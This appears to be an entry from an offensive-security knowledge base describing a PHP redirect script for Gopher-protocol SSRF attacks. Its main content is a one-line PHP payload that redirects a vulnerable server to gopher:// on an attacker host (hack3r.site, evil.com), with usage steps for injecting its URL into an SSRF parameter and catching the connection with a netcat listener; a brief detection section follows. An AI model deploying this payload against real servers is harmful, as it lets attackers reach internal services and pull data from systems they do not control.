---
id: cfcb6520-ef6c-4dd5-8150-0e82c0b1df41
type: code
language: PHP
verified: true
created_at: '2023-04-06T03:56:37.944134+00:00'
updated_at: '2023-10-10T20:24:09.799895+00:00'
platforms:
  - Web
tags:
  - ssrf
  - gopher
  - redirect
validated: true
---

# PHP-Gopher-SSRF-Redirect

## Code

```php
<?php
header("Location: gopher://$ATTACKER_HOST:$ATTACKER_PORT/_$PAYLOAD!");
?>
```

## Description

This PHP code snippet creates a simple redirect page that forces a browser or SSRF-vulnerable fetcher to follow a Location header pointing to a Gopher URL. The Gopher protocol encapsulates the payload to trigger an SMTP back-connect to the attacker's listener, exploiting SSRF to bypass protocol restrictions.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $ATTACKER_HOST | Attacker's hostname or IP for the back-connect | hack3r.site |
| $ATTACKER_PORT | Port for the listener (typically 1337 for SMTP back-connect) | 1337 |
| $PAYLOAD | Custom payload string to send via the connection (URL-encoded if needed) | SSRF%0ATest |

## Usage

Host this script on a controlled web server (e.g., as redirect.php on evil.com). In an SSRF attack, pass its URL to a vulnerable parameter (e.g., ?q=http://evil.com/redirect.php). When fetched, it redirects to the Gopher URL, causing the target server to connect back. Start a listener like `nc -lvp 1337` before triggering.

## Detection

- Web server logs showing 302 redirects to gopher:// URLs.
- Outbound connections from web servers to unusual ports/protocols (e.g., Gopher or SMTP on 1337).
- WAF rules for Location headers containing gopher:// or encoded payloads.

## Related

- [[procedures/Gopher-Protocol-SSRF-for-SMTP-Back-Connect]]
